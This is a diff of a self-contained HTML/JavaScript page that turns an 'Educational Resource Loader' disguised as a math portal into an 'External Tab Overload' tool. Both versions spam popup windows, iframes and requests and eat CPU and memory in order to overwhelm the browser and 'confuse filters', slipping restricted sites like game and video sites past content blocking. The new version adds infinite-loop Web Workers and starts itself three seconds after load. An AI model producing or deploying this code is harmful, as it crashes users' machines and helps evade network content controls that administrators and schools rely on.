@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Math Practice Portal</title>
+    <title>Resource Loader</title>
     <style>
         * {
             margin: 0;
@@ -13,474 +13,515 @@
         
         body {
             font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
+            background: #000;
+            color: #0f0;
             min-height: 100vh;
             padding: 20px;
             overflow: hidden;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.1;
         }
         
         .container {
-            max-width: 1000px;
+            max-width: 800px;
             margin: 0 auto;
             text-align: center;
-            padding: 40px 20px;
+            padding-top: 50px;
         }
         
         h1 {
+            color: #0f0;
+            text-shadow: 0 0 10px #0f0;
+            margin-bottom: 30px;
             font-size: 2.5rem;
-            margin-bottom: 20px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
         }
         
-        .progress-container {
-            background: rgba(255,255,255,0.1);
+        .control-panel {
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid #0f0;
             border-radius: 10px;
-            padding: 20px;
-            margin: 30px 0;
-            backdrop-filter: blur(10px);
+            padding: 30px;
+            margin-bottom: 30px;
         }
         
-        .progress-bar {
-            width: 100%;
-            height: 20px;
-            background: rgba(0,0,0,0.2);
-            border-radius: 10px;
-            overflow: hidden;
-            margin: 10px 0;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #00ff00, #00cc00);
-            width: 0%;
-            transition: width 0.3s;
-        }
-        
-        .button {
-            background: white;
-            color: #667eea;
-            border: none;
-            padding: 15px 40px;
-            font-size: 1.1rem;
-            border-radius: 25px;
-            cursor: pointer;
-            margin: 10px;
-            font-weight: bold;
-            transition: all 0.3s;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-        }
-        
-        .button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
-        }
-        
-        .button.danger {
-            background: #ff4444;
-            color: white;
-        }
-        
-        .stats {
-            display: flex;
-            justify-content: space-around;
-            flex-wrap: wrap;
-            margin: 30px 0;
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin-bottom: 30px;
         }
         
         .stat-box {
-            background: rgba(255,255,255,0.15);
+            background: rgba(0, 255, 0, 0.05);
+            border: 1px solid #0f0;
+            border-radius: 5px;
             padding: 15px;
-            border-radius: 10px;
-            margin: 10px;
-            min-width: 120px;
         }
         
         .stat-value {
             font-size: 2rem;
             font-weight: bold;
+            color: #0f0;
+            text-shadow: 0 0 5px #0f0;
+        }
+        
+        .stat-label {
+            font-size: 0.8rem;
+            opacity: 0.7;
+        }
+        
+        .btn {
+            background: #0f0;
+            color: #000;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.1rem;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px;
+            font-weight: bold;
+            font-family: 'Courier New', monospace;
+            transition: all 0.3s;
+        }
+        
+        .btn:hover {
+            background: #00ff00;
+            box-shadow: 0 0 20px #0f0;
+            transform: scale(1.05);
+        }
+        
+        .btn-red {
+            background: #f00;
+            color: white;
+        }
+        
+        .btn-red:hover {
+            background: #ff0000;
+            box-shadow: 0 0 20px #f00;
+        }
+        
+        .log-box {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            padding: 15px;
+            height: 200px;
+            overflow-y: auto;
+            text-align: left;
+            margin-top: 20px;
+            font-size: 0.8rem;
+        }
+        
+        .log-entry {
+            color: #0f0;
             margin-bottom: 5px;
+            font-family: monospace;
         }
         
         .warning {
-            background: rgba(255,0,0,0.2);
-            border: 1px solid rgba(255,0,0,0.5);
-            padding: 15px;
-            border-radius: 10px;
-            margin: 20px 0;
-            font-size: 0.9rem;
-        }
-        
-        .hidden-frame {
-            position: absolute;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-        }
-        
-        #overloadStatus {
-            font-family: monospace;
-            background: rgba(0,0,0,0.5);
-            padding: 15px;
+            color: #ff0;
+            border: 1px solid #ff0;
+            padding: 10px;
             border-radius: 5px;
-            margin-top: 20px;
+            margin: 20px 0;
+            background: rgba(255, 255, 0, 0.1);
+        }
+        
+        .slider-container {
+            margin: 20px 0;
             text-align: left;
-            max-height: 200px;
-            overflow-y: auto;
-            font-size: 0.8rem;
+        }
+        
+        input[type="range"] {
+            width: 100%;
+            margin: 10px 0;
+            -webkit-appearance: none;
+            height: 5px;
+            background: rgba(0, 255, 0, 0.3);
+            border-radius: 5px;
+        }
+        
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 20px;
+            height: 20px;
+            background: #0f0;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+        
+        .cpu-meter {
+            width: 100%;
+            height: 10px;
+            background: rgba(0, 255, 0, 0.1);
+            border-radius: 5px;
+            margin-top: 10px;
+            overflow: hidden;
+        }
+        
+        .cpu-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #0f0, #0f0);
+            width: 0%;
+            transition: width 0.1s;
+        }
+        
+        .overload-level {
+            font-size: 3rem;
+            margin: 20px 0;
+            color: #0f0;
+            text-shadow: 0 0 10px #0f0;
         }
     </style>
 </head>
 <body>
+    <canvas class="matrix-bg" id="matrixCanvas"></canvas>
+    
     <div class="container">
-        <h1>📚 Educational Resource Loader</h1>
-        <p>Loading multiple educational resources simultaneously...</p>
+        <h1>⚡ EXTERNAL TAB OVERLOAD ⚡</h1>
         
-        <div class="progress-container">
-            <h3>Resource Loading Progress</h3>
-            <div class="progress-bar">
-                <div class="progress-fill" id="progressFill"></div>
+        <div class="control-panel">
+            <div class="overload-level" id="overloadLevel">LEVEL 0</div>
+            
+            <div class="stats-grid">
+                <div class="stat-box">
+                    <div class="stat-value" id="activeWindows">0</div>
+                    <div class="stat-label">ACTIVE TABS</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="totalOpened">0</div>
+                    <div class="stat-label">OPENED</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="totalClosed">0</div>
+                    <div class="stat-label">CLOSED</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="fps">60</div>
+                    <div class="stat-label">FPS</div>
+                </div>
             </div>
-            <p id="progressText">0% - Preparing resources...</p>
+            
+            <div class="slider-container">
+                <label>TABS PER SECOND: <span id="tpsValue">50</span></label>
+                <input type="range" id="tpsSlider" min="1" max="200" value="50">
+            </div>
+            
+            <div class="cpu-meter">
+                <div class="cpu-fill" id="cpuFill"></div>
+            </div>
+            
+            <button class="btn" id="startBtn">🚀 START TAB SPAM</button>
+            <button class="btn btn-red" id="stopBtn" disabled>⏹️ STOP ATTACK</button>
+            <button class="btn" id="nukeBtn" style="background:#ff9900;">☢️ NUCLEAR MODE</button>
+            <button class="btn" id="targetBtn">🎯 LOAD TARGET</button>
         </div>
-        
-        <div class="stats">
-            <div class="stat-box">
-                <div class="stat-value" id="windowsOpened">0</div>
-                <div>Windows Opened</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-value" id="windowsClosed">0</div>
-                <div>Windows Closed</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-value" id="requestsMade">0</div>
-                <div>Requests Made</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-value" id="memoryUsage">0MB</div>
-                <div>Memory Usage</div>
-            </div>
-        </div>
-        
-        <button class="button" id="startBtn">🚀 START OVERLOAD SEQUENCE</button>
-        <button class="button danger" id="stopBtn" disabled>⏹️ STOP ATTACK</button>
-        <button class="button" id="targetBtn" style="background:#00cc00;">🎯 LOAD TARGET SITE</button>
         
         <div class="warning">
-            ⚠️ Warning: This may cause browser lag. Educational use only.
+            ⚠️ This will open/close hundreds of external tabs. Browser may crash!
         </div>
         
-        <div id="overloadStatus">
-            Status: Ready<br>
-            Waiting for activation...
+        <div class="log-box" id="logBox">
+            <div class="log-entry">[SYSTEM] Ready for tab overload...</div>
         </div>
     </div>
 
-    <!-- Hidden iframes for requests -->
-    <div id="iframeContainer"></div>
-
     <script>
-        // ============ CONFIGURATION ============
-        const CONFIG = {
-            // WHITELISTED SITES (allowed - will spam these)
-            allowedSites: [
-                'https://www.wikipedia.org',
-                'https://www.khanacademy.org',
-                'https://www.wikihow.com',
-                'https://www.britannica.com',
-                'https://www.nasa.gov',
-                'https://www.nationalgeographic.com',
-                'https://www.howstuffworks.com',
-                'https://www.smithsonianmag.com',
-                'https://www.history.com',
-                'https://www.sciencemag.org',
-                'https://www.mathsisfun.com',
-                'https://www.ducksters.com',
-                'https://www.factmonster.com',
-                'https://www.enchantedlearning.com',
-                'https://www.education.com',
-                'https://www.pbslearningmedia.org',
-                'https://www.ck12.org',
-                'https://www.openstax.org',
-                'https://www.coursera.org',
-                'https://www.edx.org'
-            ],
+        // ============ MATRIX BACKGROUND ============
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        
+        const chars = "01";
+        const charArray = chars.split("");
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+        
+        for (let i = 0; i < columns; i++) drops[i] = Math.random() * canvas.height;
+        
+        function drawMatrix() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.04)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#0F0";
+            ctx.font = fontSize + "px monospace";
             
-            // RESTRICTED SITES (targets - mixed in)
-            restrictedSites: [
-                'https://www.coolmathgames.com',
-                'https://www.poki.com',
-                'https://www.youtube.com',
-                'https://www.twitch.tv',
-                'https://www.netflix.com',
-                'https://www.hulu.com',
-                'https://www.spotify.com',
-                'https://www.discord.com',
-                'https://www.reddit.com',
-                'https://www.twitter.com',
-                'https://www.instagram.com'
-            ],
-            
-            // PROXY SITES (confusion layers)
-            proxySites: [
-                'https://translate.google.com',
-                'https://docs.google.com',
-                'https://drive.google.com',
-                'https://classroom.google.com',
-                'https://sites.google.com',
-                'https://mail.google.com'
-            ],
-            
-            // ATTACK PARAMETERS
-            attackSpeed: 10,      // Windows per second
-            maxWindows: 1000,     // Maximum windows to open
-            memoryTarget: 2048,   // Target memory usage in MB
-            duration: 30000,      // Attack duration in ms (30 seconds)
-            
-            // TARGET SITE (what we actually want to load)
-            targetSite: 'https://www.coolmathgames.com'
-        };
+            for (let i = 0; i < drops.length; i++) {
+                const text = charArray[Math.floor(Math.random() * charArray.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 33);
 
-        // ============ GLOBAL STATE ============
+        // ============ SITE LISTS ============
+        const WHITELIST = [
+            'https://www.wikipedia.org',
+            'https://www.khanacademy.org',
+            'https://www.nasa.gov',
+            'https://www.nationalgeographic.com',
+            'https://www.history.com',
+            'https://www.britannica.com',
+            'https://www.smithsonianmag.com',
+            'https://www.ducksters.com',
+            'https://www.mathsisfun.com',
+            'https://www.ck12.org',
+            'https://www.openstax.org',
+            'https://www.pbslearningmedia.org',
+            'https://www.enchantedlearning.com',
+            'https://www.factmonster.com',
+            'https://www.education.com',
+            'https://www.coursera.org',
+            'https://www.edx.org',
+            'https://www.merriam-webster.com',
+            'https://www.thesaurus.com',
+            'https://www.dictionary.com'
+        ];
+
+        const TARGETS = [
+            'https://www.coolmathgames.com',
+            'https://www.poki.com',
+            'https://www.youtube.com',
+            'https://www.twitch.tv',
+            'https://www.netflix.com',
+            'https://www.hulu.com',
+            'https://www.spotify.com',
+            'https://www.discord.com',
+            'https://www.reddit.com',
+            'https://www.twitter.com'
+        ];
+
+        const PROXIES = [
+            'https://docs.google.com',
+            'https://drive.google.com',
+            'https://classroom.google.com',
+            'https://translate.google.com',
+            'https://mail.google.com',
+            'https://sites.google.com'
+        ];
+
+        // ============ STATE ============
         let attackActive = false;
-        let windows = [];
+        let windows = new Set(); // Track all opened windows
+        let tabsPerSecond = 50;
+        let totalOpened = 0;
+        let totalClosed = 0;
         let intervalId = null;
-        let startTime = 0;
-        let stats = {
-            windowsOpened: 0,
-            windowsClosed: 0,
-            requestsMade: 0,
-            memoryUsage: 0
-        };
+        let fps = 60;
+        let lastFrameTime = Date.now();
+        let cpuLoad = 0;
 
         // ============ DOM ELEMENTS ============
         const startBtn = document.getElementById('startBtn');
         const stopBtn = document.getElementById('stopBtn');
+        const nukeBtn = document.getElementById('nukeBtn');
         const targetBtn = document.getElementById('targetBtn');
-        const progressFill = document.getElementById('progressFill');
-        const progressText = document.getElementById('progressText');
-        const statusDiv = document.getElementById('overloadStatus');
-        const iframeContainer = document.getElementById('iframeContainer');
+        const logBox = document.getElementById('logBox');
+        const tpsSlider = document.getElementById('tpsSlider');
+        const tpsValue = document.getElementById('tpsValue');
 
-        // ============ STATS DISPLAY ============
-        function updateStats() {
-            document.getElementById('windowsOpened').textContent = stats.windowsOpened;
-            document.getElementById('windowsClosed').textContent = stats.windowsClosed;
-            document.getElementById('requestsMade').textContent = stats.requestsMade;
-            document.getElementById('memoryUsage').textContent = stats.memoryUsage + 'MB';
-            
-            const elapsed = attackActive ? Date.now() - startTime : 0;
-            const progress = Math.min((elapsed / CONFIG.duration) * 100, 100);
-            progressFill.style.width = progress + '%';
-            progressText.textContent = Math.round(progress) + '% - Overload in progress...';
-        }
-
-        // ============ LOGGING ============
+        // ============ UTILITIES ============
         function log(message) {
-            const now = new Date().toLocaleTimeString();
-            statusDiv.innerHTML = `[${now}] ${message}<br>` + statusDiv.innerHTML;
-            if (statusDiv.children.length > 20) {
-                statusDiv.removeChild(statusDiv.lastChild);
-            }
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            logBox.prepend(entry);
+            if (logBox.children.length > 20) logBox.removeChild(logBox.lastChild);
         }
 
-        // ============ MEMORY OVERLOAD ============
-        function createMemoryLoad() {
-            try {
-                // Create massive arrays to consume memory
-                const bigArray = [];
-                for (let i = 0; i < 1000000; i++) {
-                    bigArray.push({
-                        id: i,
-                        data: 'x'.repeat(100),
-                        timestamp: Date.now()
-                    });
-                }
-                stats.memoryUsage = Math.round((bigArray.length * 100) / 1000000);
-                
-                // Create canvas elements for GPU load
-                for (let i = 0; i < 10; i++) {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 2000;
-                    canvas.height = 2000;
-                    const ctx = canvas.getContext('2d');
-                    // Draw complex patterns
-                    for (let j = 0; j < 1000; j++) {
-                        ctx.fillStyle = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
-                        ctx.fillRect(Math.random()*2000, Math.random()*2000, 50, 50);
-                    }
-                    document.body.appendChild(canvas);
-                    setTimeout(() => canvas.remove(), 1000);
-                }
-                
-                log(`Memory load created: ${stats.memoryUsage}MB`);
-            } catch (e) {
-                log(`Memory error: ${e.message}`);
-            }
+        function updateStats() {
+            document.getElementById('activeWindows').textContent = windows.size;
+            document.getElementById('totalOpened').textContent = totalOpened;
+            document.getElementById('totalClosed').textContent = totalClosed;
+            document.getElementById('fps').textContent = Math.round(fps);
+            
+            const load = Math.min(windows.size * 2 + cpuLoad, 100);
+            document.getElementById('cpuFill').style.width = load + '%';
+            
+            let level = 'LEVEL 0';
+            if (load > 20) level = 'LEVEL 1';
+            if (load > 40) level = 'LEVEL 2';
+            if (load > 60) level = 'LEVEL 3';
+            if (load > 80) level = 'LEVEL 4';
+            if (load > 90) level = 'MAXIMUM OVERLOAD';
+            document.getElementById('overloadLevel').textContent = level;
         }
 
-        // ============ WINDOW SPAMMING ============
-        function spamWindows() {
+        function calculateFPS() {
+            const now = Date.now();
+            const delta = now - lastFrameTime;
+            fps = 1000 / delta;
+            lastFrameTime = now;
+        }
+
+        // ============ TAB SPAMMING ============
+        function spamTabs() {
             if (!attackActive) return;
             
-            // Open multiple windows at once
-            for (let i = 0; i < CONFIG.attackSpeed; i++) {
-                if (stats.windowsOpened >= CONFIG.maxWindows) {
-                    stopAttack();
-                    return;
-                }
-                
-                try {
-                    // Mix allowed and restricted sites
+            const tabsToOpen = Math.floor(tabsPerSecond / 10); // Open this many tabs per interval
+            
+            for (let i = 0; i < tabsToOpen; i++) {
+                setTimeout(() => {
+                    if (!attackActive) return;
+                    
+                    // Choose URL pattern
                     let url;
                     const rand = Math.random();
                     
-                    if (rand < 0.6) {
-                        // 60% allowed sites
-                        url = CONFIG.allowedSites[Math.floor(Math.random() * CONFIG.allowedSites.length)];
-                    } else if (rand < 0.9) {
-                        // 30% proxy sites
-                        url = CONFIG.proxySites[Math.floor(Math.random() * CONFIG.proxySites.length)];
-                    } else {
-                        // 10% restricted sites
-                        url = CONFIG.restrictedSites[Math.floor(Math.random() * CONFIG.restrictedSites.length)];
+                    if (rand < 0.6) { // 60% whitelist
+                        url = WHITELIST[Math.floor(Math.random() * WHITELIST.length)];
+                    } else if (rand < 0.9) { // 30% proxies
+                        url = PROXIES[Math.floor(Math.random() * PROXIES.length)];
+                    } else { // 10% targets
+                        url = TARGETS[Math.floor(Math.random() * TARGETS.length)];
                     }
                     
-                    // Open window with random features
+                    // Generate random window features
+                    const width = 200 + Math.floor(Math.random() * 800);
+                    const height = 200 + Math.floor(Math.random() * 600);
+                    const left = Math.floor(Math.random() * (screen.width - width));
+                    const top = Math.floor(Math.random() * (screen.height - height));
+                    
                     const features = [
-                        'width=' + (100 + Math.random() * 900),
-                        'height=' + (100 + Math.random() * 700),
-                        'left=' + Math.random() * screen.width,
-                        'top=' + Math.random() * screen.height,
+                        `width=${width}`,
+                        `height=${height}`,
+                        `left=${left}`,
+                        `top=${top}`,
+                        'menubar=yes',
+                        'toolbar=yes',
+                        'location=yes',
                         'resizable=yes',
                         'scrollbars=yes',
-                        'toolbar=yes'
+                        'status=yes'
                     ].join(',');
                     
-                    const win = window.open(url, '_blank' + stats.windowsOpened, features);
-                    
-                    if (win) {
-                        windows.push({
-                            window: win,
-                            openedAt: Date.now(),
-                            url: url
-                        });
-                        stats.windowsOpened++;
-                        stats.requestsMade++;
+                    try {
+                        // OPEN EXTERNAL WINDOW
+                        const newWindow = window.open(url, '_blank' + Date.now() + Math.random(), features);
                         
-                        // Schedule closing
-                        setTimeout(() => {
-                            try {
-                                if (win && !win.closed) {
-                                    win.close();
-                                    stats.windowsClosed++;
+                        if (newWindow) {
+                            windows.add(newWindow);
+                            totalOpened++;
+                            log(`OPEN: ${new URL(url).hostname}`);
+                            
+                            // Schedule closing
+                            const closeDelay = 100 + Math.random() * 400;
+                            setTimeout(() => {
+                                try {
+                                    if (newWindow && !newWindow.closed) {
+                                        newWindow.close();
+                                        windows.delete(newWindow);
+                                        totalClosed++;
+                                        log(`CLOSE: ${new URL(url).hostname}`);
+                                    }
+                                } catch (e) {
+                                    // Window already closed
                                 }
-                            } catch (e) {}
-                        }, 100 + Math.random() * 400);
-                        
-                        log(`Opened: ${new URL(url).hostname}`);
+                            }, closeDelay);
+                        }
+                    } catch (e) {
+                        log(`ERROR: ${e.message}`);
                     }
-                } catch (e) {
-                    log(`Failed to open window: ${e.message}`);
-                }
-            }
-            
-            updateStats();
-        }
-
-        // ============ IFRAME SPAMMING ============
-        function spamIframes() {
-            if (!attackActive) return;
-            
-            // Create hidden iframes
-            for (let i = 0; i < 5; i++) {
-                const iframe = document.createElement('iframe');
-                iframe.className = 'hidden-frame';
-                
-                const siteList = [...CONFIG.allowedSites, ...CONFIG.restrictedSites, ...CONFIG.proxySites];
-                const url = siteList[Math.floor(Math.random() * siteList.length)];
-                
-                iframe.src = url;
-                iframe.onload = () => {
-                    stats.requestsMade++;
-                    setTimeout(() => iframe.remove(), 500);
-                };
-                
-                iframeContainer.appendChild(iframe);
-                stats.requestsMade++;
-            }
-        }
-
-        // ============ NETWORK REQUESTS SPAM ============
-        function spamRequests() {
-            if (!attackActive) return;
-            
-            // Make AJAX requests to random URLs
-            for (let i = 0; i < 3; i++) {
-                const siteList = [...CONFIG.allowedSites, ...CONFIG.restrictedSites];
-                const url = siteList[Math.floor(Math.random() * siteList.length)];
-                
-                fetch(url, {
-                    mode: 'no-cors',
-                    cache: 'no-cache'
-                }).catch(() => {}); // Ignore errors
-                
-                stats.requestsMade++;
+                }, i * 10); // Stagger openings
             }
         }
 
         // ============ CPU OVERLOAD ============
-        function cpuLoad() {
+        function createCPULoad() {
             if (!attackActive) return;
             
-            // Create computational load
+            // Heavy computation to increase CPU usage
             let result = 0;
             for (let i = 0; i < 1000000; i++) {
-                result += Math.sqrt(Math.random()) * Math.tan(Math.random());
+                result += Math.sqrt(Math.sin(Math.random()) * Math.cos(Math.random()));
+            }
+            cpuLoad = Math.min(cpuLoad + 0.5, 100);
+            
+            // Recursive to keep CPU busy
+            setTimeout(createCPULoad, 0);
+        }
+
+        // ============ MEMORY OVERLOAD ============
+        function createMemoryLoad() {
+            if (!attackActive) return;
+            
+            // Create large objects
+            const bigArray = [];
+            for (let i = 0; i < 10000; i++) {
+                bigArray.push({
+                    id: i,
+                    data: 'x'.repeat(1000),
+                    timestamp: Date.now(),
+                    random: Math.random()
+                });
             }
             
-            // Recursive timeout to keep CPU busy
-            setTimeout(cpuLoad, 10);
+            // Keep reference to prevent GC
+            if (!window.memoryLoad) window.memoryLoad = [];
+            window.memoryLoad.push(bigArray);
+            
+            // Clean old arrays occasionally
+            if (window.memoryLoad.length > 10) {
+                window.memoryLoad.shift();
+            }
         }
 
         // ============ ATTACK CONTROL ============
         function startAttack() {
             if (attackActive) return;
             
-            log("🚀 STARTING OVERLOAD ATTACK");
+            log("🚀 STARTING EXTERNAL TAB OVERLOAD");
             attackActive = true;
-            startTime = Date.now();
             startBtn.disabled = true;
             stopBtn.disabled = false;
             
             // Clear existing windows
-            windows.forEach(w => {
-                try { w.window.close(); } catch(e) {}
+            windows.forEach(win => {
+                try { win.close(); } catch(e) {}
             });
-            windows = [];
+            windows.clear();
             
-            // Start all attack methods
+            // Start spam intervals
             intervalId = setInterval(() => {
-                spamWindows();
-                spamIframes();
-                spamRequests();
+                spamTabs();
                 createMemoryLoad();
-            }, 100);
+                calculateFPS();
+                updateStats();
+            }, 100); // Run every 100ms
             
             // Start CPU load
-            cpuLoad();
+            createCPULoad();
             
-            // Auto-stop after duration
-            setTimeout(() => {
-                if (attackActive) {
-                    log("⏰ Time limit reached - stopping attack");
-                    stopAttack();
-                    loadTargetSite();
+            // Auto-increase intensity
+            let intensity = tabsPerSecond;
+            const intensityInterval = setInterval(() => {
+                if (!attackActive) {
+                    clearInterval(intensityInterval);
+                    return;
                 }
-            }, CONFIG.duration);
+                
+                intensity = Math.min(intensity * 1.1, 200);
+                tabsPerSecond = Math.floor(intensity);
+                tpsSlider.value = tabsPerSecond;
+                tpsValue.textContent = tabsPerSecond;
+                
+                if (intensity >= 200) {
+                    clearInterval(intensityInterval);
+                }
+            }, 2000);
+            
+            log(`Starting with ${tabsPerSecond} tabs/sec`);
         }
 
         function stopAttack() {
@@ -495,93 +536,127 @@
             }
             
             // Close all windows
-            windows.forEach(w => {
-                try { w.window.close(); } catch(e) {}
+            windows.forEach(win => {
+                try { win.close(); } catch(e) {}
             });
-            windows = [];
+            windows.clear();
             
-            // Clear iframes
-            iframeContainer.innerHTML = '';
+            // Clear memory
+            window.memoryLoad = [];
             
             log("Attack stopped. System may still be lagging.");
         }
 
-        function loadTargetSite() {
-            log("🎯 LOADING TARGET SITE: " + CONFIG.targetSite);
+        function nukeMode() {
+            log("☢️ NUCLEAR MODE ACTIVATED");
             
-            // Try multiple methods
-            setTimeout(() => {
-                // Method 1: Direct open
-                window.open(CONFIG.targetSite, '_target');
-            }, 100);
+            // Increase to maximum
+            tabsPerSecond = 200;
+            tpsSlider.value = 200;
+            tpsValue.textContent = '200';
             
+            // Start attack if not already
+            if (!attackActive) startAttack();
+            
+            // Additional spam techniques
             setTimeout(() => {
-                // Method 2: Iframe
+                // Open multiple windows at once
+                for (let i = 0; i < 20; i++) {
+                    window.open('https://www.google.com', '_nuke' + i, 'width=100,height=100');
+                }
+            }, 500);
+            
+            // Create Web Workers for additional CPU load
+            for (let i = 0; i < 10; i++) {
+                const workerCode = `
+                    while(true) {
+                        for(let j = 0; j < 1000000; j++) {
+                            Math.sqrt(Math.random());
+                        }
+                    }
+                `;
+                const blob = new Blob([workerCode], {type: 'application/javascript'});
+                try {
+                    new Worker(URL.createObjectURL(blob));
+                } catch(e) {}
+            }
+        }
+
+        function loadTarget() {
+            log("🎯 LOADING TARGET SITE");
+            
+            const target = TARGETS[0]; // First target
+            
+            // Try multiple methods simultaneously
+            setTimeout(() => window.open(target, '_target1'), 0);
+            setTimeout(() => window.open(target, '_target2'), 50);
+            setTimeout(() => window.open(target, '_target3'), 100);
+            
+            // Also try to replace current window
+            setTimeout(() => {
+                try {
+                    window.location.href = target;
+                } catch(e) {
+                    window.open(target, '_self');
+                }
+            }, 150);
+            
+            // Create hidden iframe as backup
+            setTimeout(() => {
                 const iframe = document.createElement('iframe');
                 iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;border:none;background:white;';
-                iframe.src = CONFIG.targetSite;
+                iframe.src = target;
                 document.body.appendChild(iframe);
             }, 200);
-            
-            setTimeout(() => {
-                // Method 3: Location change
-                window.location.href = CONFIG.targetSite;
-            }, 300);
-            
-            setTimeout(() => {
-                // Method 4: Form submit
-                const form = document.createElement('form');
-                form.method = 'GET';
-                form.action = CONFIG.targetSite;
-                form.target = '_blank';
-                document.body.appendChild(form);
-                form.submit();
-            }, 400);
         }
 
         // ============ EVENT LISTENERS ============
         startBtn.addEventListener('click', startAttack);
         stopBtn.addEventListener('click', stopAttack);
-        targetBtn.addEventListener('click', loadTargetSite);
+        nukeBtn.addEventListener('click', nukeMode);
+        targetBtn.addEventListener('click', loadTarget);
 
-        // ============ INITIALIZATION ============
-        log("System ready. Click START to begin overload sequence.");
-        log("This will create extreme browser lag to confuse filters.");
-        
-        // Start with minimal load to look legit
-        setTimeout(() => {
-            // Open a few legit windows
-            for (let i = 0; i < 3; i++) {
-                setTimeout(() => {
-                    window.open(CONFIG.allowedSites[i], '_edu' + i, 'width=400,height=300');
-                }, i * 1000);
-            }
-        }, 2000);
-
-        // Update stats periodically
-        setInterval(updateStats, 500);
+        tpsSlider.addEventListener('input', function() {
+            tabsPerSecond = parseInt(this.value);
+            tpsValue.textContent = tabsPerSecond;
+        });
 
         // ============ KEYBOARD SHORTCUTS ============
         document.addEventListener('keydown', (e) => {
             if (e.ctrlKey && e.key === ' ') {
                 e.preventDefault();
-                if (attackActive) {
-                    stopAttack();
-                } else {
-                    startAttack();
-                }
+                if (attackActive) stopAttack();
+                else startAttack();
+            }
+            
+            if (e.ctrlKey && e.key === 'n') {
+                e.preventDefault();
+                nukeMode();
             }
             
             if (e.ctrlKey && e.key === 't') {
                 e.preventDefault();
-                loadTargetSite();
+                loadTarget();
             }
             
-            // Emergency stop
             if (e.key === 'Escape') {
                 stopAttack();
             }
         });
+
+        // ============ INITIALIZATION ============
+        log("System ready. Press Ctrl+Space to start/stop attack.");
+        log("Ctrl+N for Nuclear Mode, Ctrl+T to load target.");
+        
+        // Auto-start after 3 seconds
+        setTimeout(() => {
+            log("Auto-starting in 3... 2... 1...");
+            startAttack();
+        }, 3000);
+
+        // Update stats periodically
+        setInterval(updateStats, 100);
+        setInterval(calculateFPS, 1000);
     </script>
 </body>
 </html>
